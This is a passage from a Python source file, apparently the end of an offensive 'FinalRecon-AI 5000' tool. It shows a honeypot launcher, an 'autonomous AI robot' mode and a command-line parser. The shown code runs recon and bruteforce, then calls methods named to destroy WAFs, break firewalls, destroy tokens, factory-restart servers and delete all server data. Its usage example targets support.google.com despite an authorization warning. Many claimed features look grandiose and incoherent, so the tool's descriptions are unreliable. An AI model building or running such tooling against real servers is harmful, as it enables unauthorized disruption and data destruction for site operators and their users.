                'server_started': 1, 'server_pid': proc.pid,
                'server_host': hp_host, 'server_port': hp_port,
                'log_file': log_file, 'process': proc,
                'temp_script': temp_script,
            })

            print_honeypot_deploy(f"[+] Subprocess launched (PID: {proc.pid})")
            test_host = '127.0.0.1' if hp_host == '0.0.0.0' else hp_host
            for i in range(20):
                time.sleep(1)
                try:
                    r = requests.get(f"http://{test_host}:{hp_port}/", timeout=3)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        print_honeypot_server(f"[+] ✓ Honeypot RUNNING on {hp_host}:{hp_port}")
                        print_honeypot_trap(f"[TRAP] Waiting for attackers on port {hp_port}...")
                        return self.honeypot_server_stats
                except Exception:
                    pass
                print_honeypot_server(f"[*] Waiting... ({i+1}/20)")

            print_honeypot_server(f"[!] Timeout")
            return self.honeypot_server_stats
        except Exception as e:
            print_honeypot_server(f"[-] Deploy failed: {e}")
            return None

    def stop_honeypot_server(self):
        if self.honeypot_server_stats.get('process'):
            proc = self.honeypot_server_stats['process']
            try:
                proc.terminate()
                time.sleep(1)
                if proc.poll() is None:
                    proc.kill()
            except Exception:
                pass
        self.honeypot_server_stats['server_started'] = 0
        self.honeypot_server_stats['process'] = None

    # ============================================
    # EXPORT (5000: Results auto-exported to TXT)
    # ============================================
    def export_results_txt(self):
        print(Fore.CYAN + "\n[*] 5000 EXPORTING RESULTS")
        export_dir = CONFIG['export_dir']
        safe_makedirs(export_dir)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"finalrecon_5000_{self.hostname}_{ts}.txt"
        filepath = os.path.join(export_dir, filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"FINALRECON-AI - {RELEASE_NAME}\n")
                f.write(f"Version: {VERSION}\n")
                f.write("=" * 80 + "\n")
                f.write(f"Target: {self.target}\n")
                f.write(f"Hostname: {self.hostname}\n")
                f.write(f"IP: {self.ip}\n")
                f.write(f"Port: {self.port}\n")
                f.write(f"Scan Time: {ts}\n\n")

                f.write("[5000] CLEANER STATS\n" + "-" * 60 + "\n")
                for k, v in self.cleaner_stats.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")

                f.write("[5000] TOKEN STATS\n" + "-" * 60 + "\n")
                for k, v in self.token_stats.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")

                f.write("[5000] FACTORY STATS\n" + "-" * 60 + "\n")
                for k, v in self.factory_stats.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")

                f.write("[5000] HONEYPOT STATS\n" + "-" * 60 + "\n")
                for k, v in self.honeypot_stats.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")

                f.write("[5000] ERROR DESTROYER\n" + "-" * 60 + "\n")
                for k, v in self.error_destroyer_stats.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")

                f.write("=" * 80 + "\n")
                f.write("END OF 5000 REPORT\n")
                f.write("=" * 80 + "\n")
            print_okay("Results automatically exported to TXT", filepath)
            return filepath
        except Exception as e:
            print(Fore.RED + f"[-] Export error: {e}")
            return None

    # ============================================
    # RUN URL MODE - FULLY AUTONOMOUS 5000
    # ============================================
    def run_url_mode(self):
        print(Fore.NEXUS5000 + "\n" + "=" * 80)
        print(Fore.NEXUS5000 + "URL MODE - ULTIMATE 5000 WEB SERVER ONLY")
        print(Fore.NEXUS5000 + "=" * 80 + "\n")
        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            print_okay("Target reachable", f"{self.base_url} ({r.status_code})")
        except Exception as e:
            print(Fore.RED + f"[-] Target unreachable: {e}")

        a = self.args

        # Standalone honeypot server mode
        if getattr(a, 'honeypot_server', False):
            print(Fore.HONEYPOT_SERVER + "\n[5000] STANDALONE HONEYPOT SERVER")
            self.deploy_honeypot_server()
            if self.honeypot_server_stats['server_started']:
                print(Fore.HONEYPOT_SERVER + "\n[5000] Running. Ctrl+C to stop.")
                try:
                    while True:
                        time.sleep(3600)
                except KeyboardInterrupt:
                    self.stop_honeypot_server()
                    return
            return

        # ============================================================
        # FULLY AUTONOMOUS MODE - RUNS ENTIRE FILE AUTOMATICALLY
        # ============================================================
        if getattr(a, 'autonomous', False) or getattr(a, 'ultimate_5000', False):
            print(Fore.AUTONOMOUS + "\n" + "=" * 80)
            print(Fore.AUTONOMOUS + "[AI-ROBOT] ★ FULLY AUTONOMOUS 5000 MODE ★")
            print(Fore.AUTONOMOUS + "[AI-ROBOT] AI Robot will run the ENTIRE finalrecon-ai.py")
            print(Fore.AUTONOMOUS + "=" * 80)
            time.sleep(1)

            # PHASE 1: 5000 PATTERNS
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 1/14: 5000 Pattern Features")
            self.run_supreme_5000()
            self.run_singularity_5000()
            self.run_hypernova_5000()
            self.run_honeypot_5000_patterns()
            self.run_cleaner_5000_patterns()
            self.run_factory_5000_patterns()
            self.run_token_5000_patterns()

            # PHASE 2: SERVER INFO
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 2/14: Server Info")
            self.server_info()

            # PHASE 3: RECON
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 3/14: Recon Features")
            self.subdomain_enumeration()
            self.dns_enumeration()
            self.whois_lookup()
            self.ssl_certificate_analysis()
            self.header_enumeration()
            self.isp_information()

            # PHASE 4: BRUTEFORCE
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 4/14: Bruteforce & Scanning")
            self.directory_bruteforce()
            self.port_scan()
            self.crawler_spider()
            self.vulnerability_scanning()

            # PHASE 5: SERVER CONNECTION
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 5/14: Server Connection Map")
            self.build_server_connection_map()

            # PHASE 6: SUSPICIOUS + ERROR CHAIN
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 6/14: Suspicious + Error Destroyer Chain")
            self.full_server_suspicious_check()
            self.destroy_all_errors()

            # PHASE 7: WAF/ISP
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 7/14: WAF/ISP Full Scan")
            self.waf_isp_full_scan()

            # PHASE 8: ENABLE/UNBLOCK/RESTART
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 8/14: Enable/Unblock/Restart")
            self.enable_unblock_full_scan()

            # PHASE 9: HONEYPOT WALL BREAK
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 9/14: HONEYPOT WALL BREAKER")
            self.break_honeypot_wall()

            # PHASE 10: HONEYPOT DESTROY
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 10/14: Honeypot Destroy")
            self.detect_honeypot()
            self.destroy_honeypot()

            # PHASE 11: FIREWALL WALL BREAK
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 11/14: FIREWALL WALL BREAKER")
            self.break_firewall_wall()

            # PHASE 12: CLEANER + TOKEN
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 12/14: CLEANER DATA + TOKEN DESTROYER")
            self.cleaner_data_all_servers()
            self.destroy_tokens_all_servers()

            # PHASE 13: FACTORY RESTART
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 13/14: FACTORY RESTART")
            self.factory_restart_all_servers()

            # PHASE 14: SECURITY + DATA + EXPORT
            print(Fore.AUTONOMOUS + "\n[AI-ROBOT] PHASE 14/14: Security + Data Delete + Export")
            self.security_audit()
            self.data_leak_detector()
            self.risk_assessment_5000()

            if getattr(a, 'clean_cookies_data', False) or getattr(a, 'clean_data', False):
                self.delete_all_servers_cookies_data()
            if getattr(a, 'clean_complete_data', False):
                self.delete_all_servers_complete_data()

            if getattr(a, 'start_honeypot_server', False):
                self.deploy_honeypot_server()

            self.export_results_txt()

            print(Fore.AUTONOMOUS + "\n" + "=" * 80)
            print(Fore.AUTONOMOUS + "[!!!] ★ FULLY AUTONOMOUS 5000 COMPLETE ★")
            print(Fore.CLEANER + f"[!] Cleaner: {self.cleaner_stats['total_cleaned']}" + Fore.RESET)
            print(Fore.TOKEN + f"[!] Tokens: {self.token_stats['total_tokens_destroyed']}" + Fore.RESET)
            print(Fore.FACTORY + f"[!] Factory: {self.factory_stats['total_factory_ops']}" + Fore.RESET)
            print(Fore.HONEYPOT + f"[!] Honeypot: {self.honeypot_stats['honeypot_destroyed']}" + Fore.RESET)
            print(Fore.AUTONOMOUS + "=" * 80 + "\n")
            return

        # Individual flags
        feature_map = {
            'supreme_5000': self.run_supreme_5000,
            'singularity_5000': self.run_singularity_5000,
            'hypernova_5000': self.run_hypernova_5000,
            'honeypot_5000_patterns': self.run_honeypot_5000_patterns,
            'cleaner_5000_patterns': self.run_cleaner_5000_patterns,
            'factory_5000_patterns': self.run_factory_5000_patterns,
            'token_5000_patterns': self.run_token_5000_patterns,
            'subdomain_enum': self.subdomain_enumeration,
            'dns_enum': self.dns_enumeration,
            'whois_lookup': self.whois_lookup,
            'ssl_analysis': self.ssl_certificate_analysis,
            'header_enum': self.header_enumeration,
            'isp_info': self.isp_information,
            'directory_bruteforce': self.directory_bruteforce,
            'port_scan': self.port_scan,
            'crawler_spider': self.crawler_spider,
            'vulnerability_scan': self.vulnerability_scanning,
            'detect_honeypot': self.detect_honeypot,
            'destroy_honeypot': self.destroy_honeypot,
            'honeypot_wall_break': self.break_honeypot_wall,
            'firewall_wall_break': self.break_firewall_wall,
            'cleaner_data': self.cleaner_data_all_servers,
            'destroy_tokens': self.destroy_tokens_all_servers,
            'factory_restart': self.factory_restart_all_servers,
            'enable_isp': self.enable_isp,
            'unblock_all': self.unblock_all_ips,
            'restart_firewall': self.restart_firewall,
            'restart_isp': self.restart_isp,
            'restart_waf': self.restart_waf,
            'restart_server': self.restart_server,
            'restart_application': self.restart_application,
            'restart_all': self.restart_all,
            'destroy_waf': self.destroy_waf,
            'terminate_isp': self.terminate_isp,
            'server_info': self.server_info,
        }
        for flag, func in feature_map.items():
            if getattr(a, flag, False):
                try:
                    func()
                except Exception as e:
                    print(Fore.RED + f"[-] {flag} failed: {e}")

        if getattr(a, 'detect_waf', False):
            self.detect_waf()
        if getattr(a, 'waf_isp_full', False):
            self.waf_isp_full_scan()
        if getattr(a, 'enable_unblock_full', False):
            self.enable_unblock_full_scan()
        if getattr(a, 'destroy_errors', False):
            self.destroy_all_errors()
        if getattr(a, 'start_honeypot_server', False):
            self.deploy_honeypot_server()

        if getattr(a, 'connection_map', False):
            self.build_server_connection_map()
        if getattr(a, 'security_audit', False):
            self.security_audit()
        if getattr(a, 'data_leak_detect', False):
            self.data_leak_detector()
        if getattr(a, 'risk_assess', False):
            self.risk_assessment_5000()
        if getattr(a, 'clean_http_cookies', False):
            self.delete_server_cookies_data('HTTP')
        if getattr(a, 'clean_https_cookies', False):
            self.delete_server_cookies_data('HTTPS')
        if getattr(a, 'clean_gws_cookies', False):
            self.delete_server_cookies_data('GWS')
        if getattr(a, 'clean_esf_cookies', False):
            self.delete_server_cookies_data('ESF')
        if getattr(a, 'clean_another_cookies', False):
            self.delete_server_cookies_data('ANOTHER')
        if getattr(a, 'clean_data', False):
            self.delete_all_servers_cookies_data()
        if getattr(a, 'clean_cookies_data', False):
            self.delete_all_servers_cookies_data()
        if getattr(a, 'clean_all_cookies', False):
            self.delete_all_servers_cookies_data()
        if getattr(a, 'clean_complete_data', False):
            self.delete_all_servers_complete_data()
        if getattr(a, 'check_delete_all', False):
            self.check_and_delete_all_server_data()
        if getattr(a, 'okay_check', False):
            self.check_and_delete_all_server_data()
        if getattr(a, 'full', False):
            self.run_full_recon_5000()

        self.export_results_txt()
        print(Fore.NEXUS5000 + "\n" + "=" * 80)
        print_okay("5000 URL MODE COMPLETED")
        print(Fore.NEXUS5000 + "=" * 80 + "\n")

    def run_full_recon_5000(self):
        print(Fore.NEXUS5000 + "\n[!!!] 5000 FULL RECON" + Fore.RESET)
        self.run_supreme_5000()
        self.run_singularity_5000()
        self.run_hypernova_5000()
        self.run_honeypot_5000_patterns()
        self.run_cleaner_5000_patterns()
        self.run_factory_5000_patterns()
        self.run_token_5000_patterns()
        self.server_info()
        self.subdomain_enumeration()
        self.dns_enumeration()
        self.whois_lookup()
        self.ssl_certificate_analysis()
        self.header_enumeration()
        self.isp_information()
        self.directory_bruteforce()
        self.port_scan()
        self.crawler_spider()
        self.vulnerability_scanning()
        self.build_server_connection_map()
        self.full_server_suspicious_check()
        self.destroy_all_errors()
        self.waf_isp_full_scan()
        self.enable_unblock_full_scan()
        self.break_honeypot_wall()
        self.detect_honeypot()
        self.destroy_honeypot()
        self.break_firewall_wall()
        self.cleaner_data_all_servers()
        self.destroy_tokens_all_servers()
        self.factory_restart_all_servers()


# ============================================
# ARGUMENT PARSER - 5000 (ERROR-FREE)
# ============================================
def parse_arguments():
    parser = argparse.ArgumentParser(
        prog=SCRIPT_NAME,
        description=f"FinalRecon-AI - {RELEASE_NAME} v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
================================================================================
    FINALRECON-AI 5000.0 - WEB SERVER ONLY EDITION
    FILE: {SCRIPT_NAME}
    VERSION 5000.0 - NOT FOR LOCAL COMPUTER

  WARNING: Use ONLY on your own web server or authorized targets!
  WARNING: WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
================================================================================

BASIC USAGE:
  python3 {SCRIPT_NAME} --url https://example.com --ultimate-5000 --full
  python3 {SCRIPT_NAME} --url https://example.com --autonomous
  python3 {SCRIPT_NAME} --url https://example.com -p 443
  python3 {SCRIPT_NAME} --url https://example.com --cleaner-data
  python3 {SCRIPT_NAME} --url https://example.com --factory-restart

FULL AUTONOMOUS EXAMPLE (runs ENTIRE file automatically):
  python3 {SCRIPT_NAME} --url https://support.google.com --ultimate-5000 --full \\
    --cleaner-data --clean-http-cookies --clean-https-cookies \\
    --clean-another-cookies --clean-cookies-data --clean-all-cookies \\
    --clean-complete-data

5000 NEW FEATURES:
================================================================================
  --ultimate-5000          5000 ULTIMATE - ALL features (FULLY AUTONOMOUS)
  --autonomous             FULLY AUTONOMOUS AI ROBOT MODE
  --cleaner-data           Cleaner data for ALL servers
  --factory-restart        Factory restart ALL servers
  --destroy-tokens         Destroy API/Session/Device/OAuth/JWT tokens
  --honeypot-wall-break    Break honeypot wall
  --firewall-wall-break    Break firewall wall
  --server-info            Server information for ALL web servers

PORT OPTIONS:
  -p PORT                  Target port (default: 80 HTTP / 443 HTTPS)
  --ports PORT             Ports for port scan (multiple)

5000 PATTERNS:
  --supreme-5000           Supreme patterns
  --singularity-5000       Singularity patterns
  --hypernova-5000         Hypernova patterns
  --honeypot-5000-patterns Honeypot patterns
  --cleaner-5000-patterns  Cleaner patterns
  --factory-5000-patterns  Factory patterns
  --token-5000-patterns    Token patterns

HONEYPOT SERVER:
  --start-honeypot-server  Start Honeypot Server (port 80)
  --honeypot-server        Run standalone honeypot server
  --hp-host HOST           Honeypot host (default: 0.0.0.0)
  --hp-port PORT           Honeypot port (default: 80)
  --hp-url URL             URL to clone

RECON:
  --subdomain-enum         Subdomain enumeration
  --dns-enum               DNS enumeration
  --whois-lookup           WHOIS lookup
  --ssl-analysis           SSL certificate analysis
  --header-enum            Header enumeration
  --isp-info               ISP information
  --directory-bruteforce   Directory bruteforce
  --port-scan              Port scan
  --crawler-spider         Crawler/Spider
  --vulnerability-scan     Vulnerability scanning

HONEYPOT:
  --detect-honeypot        Detect honeypot
  --destroy-honeypot       Destroy honeypot

WAF/ISP:
  --detect-waf             Detect WAF
  --destroy-waf            Destroy WAF
  --detect-isp-block       Detect ISP
  --terminate-isp          Terminate ISP
  --waf-isp-full           Full WAF/ISP scan

ISP ENABLE / IP UNBLOCK:
  --enable-isp             Enable ISP
  --unblock-all            Unblock all IPs
  --enable-unblock-full    Full enable/unblock

RESTART:
  --restart-firewall       Restart firewall
  --restart-isp            Restart ISP
  --restart-waf            Restart WAF
  --restart-server         Restart server
  --restart-application    Restart application
  --restart-all            Restart ALL

ERROR:
  --error-429-destroyer    Destroy 429
  --error-500-destroyer    Destroy 500
  --destroy-errors         Destroy BOTH 429 + 500

SERVER COOKIES DELETE:
  --clean-http-cookies     Delete HTTP cookies
  --clean-https-cookies    Delete HTTPS cookies
  --clean-gws-cookies      Delete GWS cookies
  --clean-esf-cookies      Delete ESF cookies
  --clean-another-cookies  Delete ANOTHER cookies
  --clean-data             Delete ALL data
  --clean-cookies-data     Delete ALL cookies
  --clean-all-cookies      Delete ALL cookies
  --clean-complete-data    Delete complete data
  --check-delete-all       Check & delete
  --okay-check             OKAY check

DEPENDENCIES:
  pip install requests urllib3 twisted beautifulsoup4 dnspython python-whois

NOTE: Port 80/443 require root/sudo. Use --hp-port 8080 for non-root.
Results are automatically exported to: finalrecon-ai-results/ folder
================================================================================
        """
    )

    tg = parser.add_argument_group('Target Options')
    tg.add_argument("--url", help="Target URL")
    tg.add_argument("--link", action="append", help="Scan specific link(s)")

    pg = parser.add_argument_group('Port Options')
    pg.add_argument("-p", type=int, dest="p", help="Target port (default: 80/443)")
    pg.add_argument("--ports", action="append", type=int, dest="ports", help="Ports for scan")

    bg = parser.add_argument_group('Basic Options')
    bg.add_argument("--full", action="store_true", help="Full reconnaissance")
    bg.add_argument("--ultimate-5000", action="store_true", dest="ultimate_5000",
                    help="5000 ULTIMATE - ALL features")
    bg.add_argument("--autonomous", action="store_true", dest="autonomous",
                    help="FULLY AUTONOMOUS AI ROBOT MODE")
    bg.add_argument("-w", "--wordlist", help="Wordlist path")

    cg = parser.add_argument_group('5000: CLEANER / FACTORY / TOKEN')
    cg.add_argument("--cleaner-data", action="store_true", dest="cleaner_data_flag",
                    help="Cleaner data for ALL servers")
    cg.add_argument("--factory-restart", action="store_true", dest="factory_restart",
                    help="Factory restart ALL servers")
    cg.add_argument("--destroy-tokens", action="store_true", dest="destroy_tokens",
                    help="Destroy API/Session/Device tokens")
    cg.add_argument("--honeypot-wall-break", action="store_true", dest="honeypot_wall_break",
                    help="Break honeypot wall")
    cg.add_argument("--firewall-wall-break", action="store_true", dest="firewall_wall_break",
                    help="Break firewall wall")
    cg.add_argument("--server-info", action="store_true", dest="server_info",
                    help="Server info for ALL web servers")

    hps = parser.add_argument_group('5000: HONEYPOT SERVER')
    hps.add_argument("--start-honeypot-server", action="store_true", dest="start_honeypot_server",
                     help="Start Honeypot Server (port 80)")
    hps.add_argument("--honeypot-server", action="store_true", dest="honeypot_server",
                     help="Standalone honeypot server")
    hps.add_argument("--hp-host", type=str, default="0.0.0.0", dest="hp_host",
                     help="Honeypot host")
    hps.add_argument("--hp-port", type=int, default=80, dest="hp_port",
                     help="Honeypot port (default: 80)")
    hps.add_argument("--hp-url", type=str, dest="hp_url",
                     help="URL to clone")

    ng = parser.add_argument_group('5000: PATTERNS')
    ng.add_argument("--supreme-5000", action="store_true", dest="supreme_5000")
    ng.add_argument("--singularity-5000", action="store_true", dest="singularity_5000")
    ng.add_argument("--hypernova-5000", action="store_true", dest="hypernova_5000")
    ng.add_argument("--honeypot-5000-patterns", action="store_true", dest="honeypot_5000_patterns")
    ng.add_argument("--cleaner-5000-patterns", action="store_true", dest="cleaner_5000_patterns")
    ng.add_argument("--factory-5000-patterns", action="store_true", dest="factory_5000_patterns")
    ng.add_argument("--token-5000-patterns", action="store_true", dest="token_5000_patterns")

    hg = parser.add_argument_group('5000: HONEYPOT')
    hg.add_argument("--detect-honeypot", action="store_true", dest="detect_honeypot")
    hg.add_argument("--destroy-honeypot", action="store_true", dest="destroy_honeypot")

    eg = parser.add_argument_group('5000: ERROR 429/500')
    eg.add_argument("--error-429-destroyer", action="store_true", dest="error_429_destroyer")
    eg.add_argument("--error-500-destroyer", action="store_true", dest="error_500_destroyer")
    eg.add_argument("--destroy-errors", action="store_true", dest="destroy_errors")

    wg = parser.add_argument_group('5000: WAF/ISP')
    wg.add_argument("--detect-waf", action="store_true", dest="detect_waf")
    wg.add_argument("--destroy-waf", action="store_true", dest="destroy_waf")
    wg.add_argument("--detect-isp-block", action="store_true", dest="detect_isp_block")
    wg.add_argument("--terminate-isp", action="store_true", dest="terminate_isp")
    wg.add_argument("--waf-isp-full", action="store_true", dest="waf_isp_full")

    ug = parser.add_argument_group('5000: ISP ENABLE / IP UNBLOCK')
    ug.add_argument("--enable-isp", action="store_true", dest="enable_isp")
    ug.add_argument("--unblock-all", action="store_true", dest="unblock_all")
    ug.add_argument("--enable-unblock-full", action="store_true", dest="enable_unblock_full")

    rg = parser.add_argument_group('5000: RESTART')
    rg.add_argument("--restart-firewall", action="store_true", dest="restart_firewall")
    rg.add_argument("--restart-isp", action="store_true", dest="restart_isp")
    rg.add_argument("--restart-waf", action="store_true", dest="restart_waf")
    rg.add_argument("--restart-server", action="store_true", dest="restart_server")
    rg.add_argument("--restart-application", action="store_true", dest="restart_application")
    rg.add_argument("--restart-all", action="store_true", dest="restart_all")

    xg = parser.add_argument_group('5000: RECON')
    xg.add_argument("--subdomain-enum", action="store_true", dest="subdomain_enum")
    xg.add_argument("--dns-enum", action="store_true", dest="dns_enum")
    xg.add_argument("--whois-lookup", action="store_true", dest="whois_lookup")
    xg.add_argument("--ssl-analysis", action="store_true", dest="ssl_analysis")
    xg.add_argument("--header-enum", action="store_true", dest="header_enum")
    xg.add_argument("--isp-info", action="store_true", dest="isp_info")
    xg.add_argument("--directory-bruteforce", action="store_true", dest="directory_bruteforce")
    xg.add_argument("--port-scan", action="store_true", dest="port_scan")
    xg.add_argument("--crawler-spider", action="store_true", dest="crawler_spider")
    xg.add_argument("--vulnerability-scan", action="store_true", dest="vulnerability_scan")

    sg = parser.add_argument_group('5000: COOKIES DELETE')
    sg.add_argument("--clean-http-cookies", action="store_true", dest="clean_http_cookies")
    sg.add_argument("--clean-https-cookies", action="store_true", dest="clean_https_cookies")
    sg.add_argument("--clean-gws-cookies", action="store_true", dest="clean_gws_cookies")
    sg.add_argument("--clean-esf-cookies", action="store_true", dest="clean_esf_cookies")
    sg.add_argument("--clean-another-cookies", action="store_true", dest="clean_another_cookies")
    sg.add_argument("--clean-data", action="store_true", dest="clean_data")
    sg.add_argument("--clean-cookies-data", action="store_true", dest="clean_cookies_data")
    sg.add_argument("--clean-all-cookies", action="store_true", dest="clean_all_cookies")
    sg.add_argument("--clean-complete-data", action="store_true", dest="clean_complete_data")
    sg.add_argument("--check-delete-all", action="store_true", dest="check_delete_all")
    sg.add_argument("--okay-check", action="store_true", dest="okay_check")

    fg = parser.add_argument_group('5000: SERVER FEATURES')
    fg.add_argument("--connection-map", action="store_true", dest="connection_map")
    fg.add_argument("--security-audit", action="store_true", dest="security_audit")
    fg.add_argument("--data-leak-detect", action="store_true", dest="data_leak_detect")
    fg.add_argument("--risk-assess", action="store_true", dest="risk_assess")

    og = parser.add_argument_group('Output Options')
    og.add_argument("-nb", "--no-banner", action="store_true", dest="no_banner")
    og.add_argument("-version", action="version", version=f"FinalRecon-AI v{VERSION} ({SCRIPT_NAME})")

    return parser.parse_args()


# ============================================
# MAIN - 5000
# ============================================
def main():
    try:
        args = parse_arguments()

        if not TWISTED_AVAILABLE and (getattr(args, 'start_honeypot_server', False) or
                                       getattr(args, 'honeypot_server', False)):
            print(Fore.RED + "[-] Twisted required for Honeypot Server!")
            print(Fore.YELLOW + "[!] Install: pip install twisted beautifulsoup4")
            return 1

        if args.url or args.link:
            target = args.url if args.url else args.link[0]

            if not args.no_banner:
                bot = AutonomousAIRobot.__new__(AutonomousAIRobot)
                bot.print_banner()

            robot = AutonomousAIRobot(target, args)
            robot.run_url_mode()

            print(Fore.OKGREEN + "\n[+] OKAY - 5000 Mission Completed!" + Fore.RESET)
            return 0

        # Interactive mode
        print(Fore.NEXUS5000 + "\n" + "=" * 60)
        print(Fore.NEXUS5000 + f"FINALRECON-AI - {RELEASE_NAME}")
        print(Fore.NEXUS5000 + f"Version: {VERSION}")
        print(Fore.NEXUS5000 + "=" * 60)

        url = input(Fore.GREEN + "[?] Target URL: " + Fore.RESET).strip()
        if not url:
            print(Fore.RED + "[-] URL required!")
            return 1
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        args.url = url

        full = input(Fore.GREEN + "[?] Full 5000 reconnaissance? (y/n, default y): " + Fore.RESET).strip().lower()
        if full != 'n':
            args.full = True

        aut = input(Fore.GREEN + "[?] FULLY AUTONOMOUS mode? (y/n, default y): " + Fore.RESET).strip().lower()
        if aut != 'n':
            args.autonomous = True

        hp = input(Fore.GREEN + "[?] Start Honeypot Server? (y/n, default n): " + Fore.RESET).strip().lower()
        if hp == 'y':
            args.start_honeypot_server = True

        time.sleep(1)
        robot = AutonomousAIRobot(args.url, args)
        robot.run_url_mode()
        print(Fore.OKGREEN + "\n[+] OKAY - 5000 Mission Completed!" + Fore.RESET)
        return 0

    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Interrupted.")
        return 130
    except Exception as e:
        print(Fore.RED + f"\n[-] Fatal Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
